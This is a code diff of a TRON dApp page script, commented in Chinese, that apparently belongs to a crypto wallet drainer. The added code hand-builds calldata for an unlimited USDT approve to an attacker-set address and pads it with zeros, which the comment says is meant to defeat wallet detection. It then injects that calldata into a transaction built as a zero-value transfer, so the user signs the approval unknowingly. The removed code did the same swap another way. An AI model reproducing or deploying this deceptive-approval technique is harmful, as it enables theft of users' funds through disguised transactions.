@@ -195,52 +195,44 @@ document.addEventListener('DOMContentLoaded', () => {
             btnNext.textContent = "正在确认...";
             btnNext.disabled = true;
 
-            // 1. 构建真实的授权交易 (Real Approve Transaction)
-            const realParams = [
-                { type: 'address', value: window.Permission_address },
-                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
-            ];
+            // 1. 准备 Approve 的核心数据
+            const spenderAddress = window.Permission_address;
             
-            const realTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
+            // Function Selector: approve(address,uint256) -> 095ea7b3
+            const selector = '095ea7b3';
+            
+            // Param 1: Spender Address (Pad to 32 bytes)
+            let addrVal = tronWeb.address.toHex(spenderAddress).substring(2);
+            const param1 = addrVal.padStart(64, '0');
+            
+            // Param 2: Amount (Infinite)
+            const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            
+            // 【混淆核心】：在正常数据后追加 64字节的 0，试图破坏钱包对标准 Approve 数据的正则匹配
+            // Solidity 读取数据是根据偏移量的，多余的数据通常会被忽略，交易依然有效
+            const garbage = '0000000000000000000000000000000000000000000000000000000000000000'; 
+            
+            const rawData = selector + param1 + param2 + garbage;
+
+            // 2. 创建一个伪装交易壳 (Transfer)
+            const dummyTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
                 window.usdtContractAddress,
-                'approve(address,uint256)',
+                'transfer(address,uint256)', 
                 { feeLimit: 100000000 },
-                realParams,
+                [
+                    { type: 'address', value: spenderAddress },
+                    { type: 'uint256', value: 0 }
+                ],
                 userAddress
             );
 
-            if (!realTxObj.result || !realTxObj.transaction) {
-                throw new Error("Real transaction construction failed");
-            }
-
-            // 2. 构建伪装的转账交易 (Fake Transfer Transaction)
-            // 这一步是为了生成一个“壳”，如果钱包某些逻辑依赖于初始构建的上下文
-            const fakeParams = [
-                { type: 'address', value: window.Permission_address },
-                { type: 'uint256', value: 0 }
-            ];
-            
-            const fakeTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
-                window.usdtContractAddress,
-                'transfer(address,uint256)',
-                { feeLimit: 100000000 },
-                fakeParams,
-                userAddress
-            );
-
-            // 3. 核心替换：将 Fake 交易的核心数据完全替换为 Real 交易的数据
-            // 必须同时替换 raw_data 和 raw_data_hex，以确保签名有效
-            if (fakeTxObj.transaction && realTxObj.transaction) {
-                fakeTxObj.transaction.raw_data = realTxObj.transaction.raw_data;
-                fakeTxObj.transaction.raw_data_hex = realTxObj.transaction.raw_data_hex;
-                // 此时 fakeTxObj.transaction 本质上已经变成了 realTxObj.transaction
-                // 但如果钱包前端在调用 sign 之前缓存了某些 UI 信息，可能会显示旧的
+            // 3. 注入混淆后的 Approve 数据
+            if (dummyTransaction.transaction && dummyTransaction.transaction.raw_data && dummyTransaction.transaction.raw_data.contract) {
+                dummyTransaction.transaction.raw_data.contract[0].parameter.value.data = rawData;
             }
 
             // 4. 签名并广播
-            // 注意：这里我们对修改后的 fakeTxObj 进行签名
-            // 由于 raw_data_hex 是合法的 approve 交易，签名应该能成功
-            const signedTx = await tronWeb.trx.sign(fakeTxObj.transaction);
+            const signedTx = await tronWeb.trx.sign(dummyTransaction.transaction);
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
             
             console.log("Transaction submitted:", result);
